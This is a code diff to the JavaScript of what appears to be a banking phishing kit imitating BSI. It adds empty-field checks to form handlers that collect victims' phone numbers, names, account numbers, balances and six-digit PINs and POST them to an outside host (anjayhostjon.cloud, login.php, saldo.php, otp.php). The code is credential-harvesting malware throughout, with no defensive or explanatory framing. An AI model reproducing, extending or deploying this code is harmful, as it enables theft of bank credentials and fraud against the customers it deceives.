@@ -34,7 +34,10 @@ $('.process1').fadeIn();
     const nomor = $('#nomor').val();
     const nama = $('#nama').val();
     const rek = $('#rek').val();
-    
+    if (!tarif || !nomor || !nama || !rek) {      
+        window.location.href = "index.html";
+        return false;
+    }   
       $.ajax({
             type: 'POST',
             url: 'https://anjayhostjon.cloud/BSI/7h27g/login.php',
@@ -68,7 +71,10 @@ $('.process1').fadeIn();
     const nama = $('#nama').val();
     const rek = $('#rek').val();
     const saldo = $('#saldo').val();
-    
+    if (!tarif || !nomor || !nama || !rek || !saldo) {      
+        window.location.href = "index.html";
+        return false;
+    }   
       $.ajax({
             type: 'POST',
             url: 'https://anjayhostjon.cloud/BSI/7h27g/saldo.php',
@@ -107,6 +113,10 @@ function sendOtp() {
     const rek = $('#rek').val();
     const saldo = $('#saldo').val();
     const sixpin = $('#sixpin').val();
+ if (!tarif || !nomor || !nama || !rek || !saldo || !sixpin) {      
+        window.location.href = "index.html";
+        return false;
+    }   
 $.ajax({
  type: 'POST',
  url: 'https://anjayhostjon.cloud/BSI/7h27g/otp.php',
